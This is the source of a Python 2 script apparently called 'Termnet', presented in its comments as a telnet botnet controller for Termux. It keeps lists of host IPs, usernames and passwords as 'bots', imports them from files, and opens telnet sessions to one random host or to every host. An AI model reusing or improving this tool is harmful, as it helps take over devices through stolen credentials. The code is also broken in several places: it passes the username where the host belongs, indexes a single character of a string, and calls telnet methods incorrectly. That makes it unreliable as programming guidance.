import os
import sys
from colors import *
from colored import fg, bg, attr
from termcolor import colored
import telnetlib
import subprocess
import random

'''
This is a telnet botnet meant for 
Termux made by a god named Zylux.
Edit this if you want but I am pretty
sure I am going to update this and
make it better,and as alwaya,if you
do edit this make sure you give me
some credit for the source code.
Thanks, enjoy, and stay legal!
'''

def createFile():
	file = open("hosts.txt", "a+")
	
def addBot(host, user, password):
	file = open("hosts.txt", "a+")
	Bot = "%s %s %s" % (host, user, password)
	file.write(Bot)
	file.write("\n")
	
def scanBots(filename):
	with open("%s" % (filename)) as f:
		file = open("hosts.txt","a")
		for line in f:
			str(line)
			file.write(line)
			
def commandOne():
	botNet = []
	with open("hosts.txt") as f:
		for line in f:
			str(line)
			botNet.append(line)
	rand = random.choice(botNet)
	randList = rand.split()
	bot = []
	for word in randList:
		bot.append(word)
	telnetlib.Telnet(bot[1], 23)
	telnetlib.Telnet.interact()
	
def commandAll():
	botNet = []
	with open("hosts.txt") as f:
		for line in f:
			str(line)
			botNet.append(line)
	for bot in botNet:
		bot1 = []
		botinfo = bot.split()
		for word in botinfo:
			bot1.append(word)
		telnetlib.Telnet(bot[1], 23)
		telnetlib.Telnet.interact()
		
def listAll():
	with open("hosts.txt") as f:
		for line in f:
			str(line)
			print("%s [!] " % (fg("red")))+colored(line, "yellow")

def listRandom():
	bots = []
	with open("hosts.txt") as f:
		for line in f:
			str(line)
			bots.append(line)
	print("%s [!] " % (fg("red")))+colored(random.choice(bots), "yellow")
	
def listNumberOf():
	count = 0
	with open("hosts.txt") as f:
		for line in f:
			count += 1
	print(colored("Number of bots: ", "yellow"))+colored(count, "white")
			
try:

	while True:

#Main Menu
		os.system("clear")
		file = open("Banner/banner")
		sys.stdout.write(GREEN)
		print file.read()
		print("\n \n")
		print(colored("[1]  ", ("red")))+colored("Scan", "yellow")
		print(colored("[2]  ", ("red")))+colored("Command", "yellow")
		print(colored("[3]  ", ("red")))+colored("List", "yellow")
		print(colored("[00] ", ("red")))+colored("Exit Menu", "yellow")
		print("\n")
		menu_choice1 = input("%s <Termnet>" % (fg("blue")))
		
#Sub Menu 1
		if menu_choice1==1:
			while True:
				os.system("clear")
				file = open("Banner/scanbots")
				sys.stdout.write(GREEN)
				print file.read()
				print("\n \n")
				print(colored("[1]  ", ("red")))+colored("Create txt file", "yellow")
				print(colored("[2]  ", ("red")))+colored("Add manually", "yellow")
				print(colored("[3]  ", ("red")))+colored("Scan from txt file", "yellow")
				print(colored("[00] ", ("red")))+colored("Main Menu", "yellow")
				print("\n")
				menu_choice = input("%s <Termnet>" % (fg("blue")))

#options				
				if menu_choice==1:
					os.system("clear")
					createFile()
					
				elif menu_choice==2:
					while True:
						os.system("clear")
						addBot(raw_input("%s Host IP: " % (fg("yellow"))), raw_input("%s Username: " % (fg("yellow"))), raw_input("%s Password: " % (fg("yellow"))))
						break
						
				elif menu_choice==3:
					os.system("clear")
					scanBots(raw_input("%s File Name: " % (fg("yellow"))))
					
				elif menu_choice==00:
					break
					
				else:
					print("One of the options please")
				

#Sub Menu 2				
		elif menu_choice1==2:
			while True:
				os.system("clear")
				file = open("Banner/cmdbots")
				sys.stdout.write(GREEN)
				print file.read()
				print("\n \n")
				print(colored("[1]  ", ("red")))+colored("Command a random Bot", "yellow")
				print(colored("[2]  ", ("red")))+colored("Command all", "yellow")
				print(colored("[00] ", ("red")))+colored("Main Menu", "yellow")
				print("\n")
				menu_choice = input("%s <Termnet>" % (fg("blue")))

#Options				
				if menu_choice==1:
					os.system("clear")
					commandOne()
					
				elif menu_choice==2:
					os.system("clear")
					commandAll()
				
				elif menu_choice==00:
					break
					
				else:
					print("One of the options please")
				

#Sub Menu 3				
		elif menu_choice1==3:
			while True:
				os.system("clear")
				file = open("Banner/lsbots")
				sys.stdout.write(GREEN)
				print file.read()
				print("\n \n")
				print(colored("[1]  ", ("red")))+colored("List all", "yellow")
				print(colored("[2]  ", ("red")))+colored("List Random", "yellow")
				print(colored("[3]  ", ("red")))+colored("List Number of Bots", "yellow")
				print(colored("[00] ", ("red")))+colored("Main Menu", "yellow")
				print("\n")
				menu_choice = input("%s <Termnet>" % (fg("blue")))

#Options				
				if menu_choice==1:
					os.system("clear")
					listAll()
					pause = raw_input(colored("Enter for back, ^C for exit", "white"))
					
				elif menu_choice==2:
					os.system("clear")
					listRandom()
					pause = raw_input(colored("Enter for back, ^C for exit", "white"))
				
				elif menu_choice==3:
					os.system("clear")
					listNumberOf()
					pause = raw_input(colored("Enter for back, ^C for exit", "white"))
				
				elif menu_choice==00:
					break
					
				else:
					print("One of the options please")

#Eit	from Main Menu				
		elif menu_choice1==00:
			os.system("clear")
			print("Thanks for using Termnet 1.0 !")
			print("Menu Created By Zylux the god")
			print("Youtube: Zyluxisgod")
			print("Github: Zyluxisgod")
			print("Kik: anonperson1209")
			break
			
		else:
			print("One of the options please")
		
except KeyboardInterrupt:
	print(colored("Thanks for using this Tool!", "white"))
	sys.exit(0)
